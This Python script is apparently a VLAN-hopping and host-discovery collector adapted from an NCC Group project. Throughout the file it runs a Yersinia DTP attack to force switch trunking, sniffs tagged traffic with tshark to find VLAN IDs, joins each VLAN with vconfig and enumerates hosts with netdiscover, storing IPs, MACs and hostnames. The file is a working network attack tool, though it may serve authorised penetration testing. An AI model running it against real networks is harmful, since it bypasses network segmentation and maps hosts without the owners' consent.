#!/usr/bin/env python3

# vlan collector utility, find vlans and perform an arp scan
# script will run through once, and store gathered data in the database
# command utility to scrape: tshark yersinia arp-scan
# gather information: vlan, host

# Python interpretation of the "vlan-hopper" project
# git clone https://github.com/nccgroup/vlan-hopping.git
# kennedyengineering 2020

# import collector module from parent directory
import os, sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from collector import Collector
import netifaces
import subprocess
import time
import ipaddress

# create collector
collector_name = "vlan"
collector = Collector(collector_name)

TAGSEC = 90
CDPSEC = 90
DTPWAIT = 20
VLANWAIT = 10

# verify that the user supplied interface is available
ifaces = netifaces.interfaces()
iface = collector.misc_config["interface"]
if iface not in ifaces:
    collector.logger.error("Interface {} not available, exiting...".format(iface))
    collector.close()
    exit()
else:
    collector.logger.debug("Interface {} found".format(iface))

# verify that CDP is enabled
collector.logger.debug("Sniffing CDP Packets on interface {}, waiting {} seconds".format(iface, CDPSEC))
command = '''sudo tshark -a duration:{} -i {} -Y "cdp" -V 2>&1 | sort --unique'''.format(CDPSEC, iface)
output = collector.execute(command)
output = output.split("\n")
for line in output:
    if "0 packets captured" in line:
        # exit if CDP was not found
        collector.logger.error("CDP is not enabled on the switch, exiting...")
        collector.close()
        exit()
collector.logger.debug("CDP is enabled on the switch")

# start yersinia exploit
collector.logger.debug("Starting attack on interface {}, waiting {} seconds".format(iface, DTPWAIT))
command = "sudo yersinia dtp -attack 1 -interface {}".format(iface)
collector.logger.debug("Executing {}".format(command))
yersinia = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
time.sleep(DTPWAIT)

# discover vlans
collector.logger.debug("Extracting VLAN IDs on interface {}, sniffing 802.1Q tagged packets for {} seconds".format(iface, TAGSEC))
command = '''sudo tshark -a duration:$TAGSEC -i $INT -Y "vlan" -x -V 2>&1 | grep -o " = ID: .*" | awk '{ print $NF }' | sort --unique'''
command = command.replace("$TAGSEC", str(TAGSEC))
command = command.replace("$INT", iface)
vlan_ids = collector.execute(command)
if not vlan_ids:
    collector.logger.error("No vlan found, exiting...")
    collector.close()
    yersinia.kill()
    exit()
collector.logger.debug("Vlan(s) found")
vlan_ids = vlan_ids.split("\n")
vlan_ids = [string for string in vlan_ids if string != ""]

# scan vlans for hosts
for vlan in vlan_ids:
    collector.logger.debug("Adding vlan {} to interface {}, waiting {} seconds".format(vlan, iface, VLANWAIT))
    command = "sudo vconfig add {} {} 2>&1".format(iface, vlan)
    null = collector.execute(command)
    time.sleep(VLANWAIT)

    collector.logger.debug("Scanning for hosts on vlan {}, with interface {}".format(vlan, iface+"."+vlan))
    command = "sudo netdiscover -N -P -i {}.{}".format(iface, vlan)
    scan_results = collector.execute(command, timeout = 90)
    if scan_results:
        collector.logger.debug("Host(s) discovered on vlan {}".format(vlan))
    else:
        collector.logger.debug("No hosts discovered on vlan {}".format(vlan))

    output = scan_results.split("\n")
    
    simplified_output = []
    for i in output:
        temp_arr = []
        i = i.split(" ")
        for ii in i:
            if ii != '':
                temp_arr.append(ii)
        simplified_output.append(temp_arr)
    simplified_output.remove([])

    for i in simplified_output:
        parsed_output = {}

        # IP Adress
        ip = i[0]
        parsed_output["IP"] = ip

        # MAC Address
        mac_address = i[1]
        parsed_output["MAC"] = mac_address
        
        # VLAN
        parsed_output["VLAN"] = vlan

        # Hostname
        name = ""
        max_index = len(i)
        for ii in range(4, max_index):
            name += i[ii] + " "
        if name != "":
            name = name[:-1]
        parsed_output["HOST_INFORMATION"] = name

        collector.publish(parsed_output)

    collector.logger.debug("Removing vlan {} from interface {}, waiting {} seconds".format(vlan, iface, VLANWAIT))
    command = "sudo vconfig rem {} 2>&1".format(iface+"."+vlan)
    null = collector.execute(command)
    time.sleep(VLANWAIT)
    
# bring down yersinia process and exit
yersinia.kill()
collector.close()

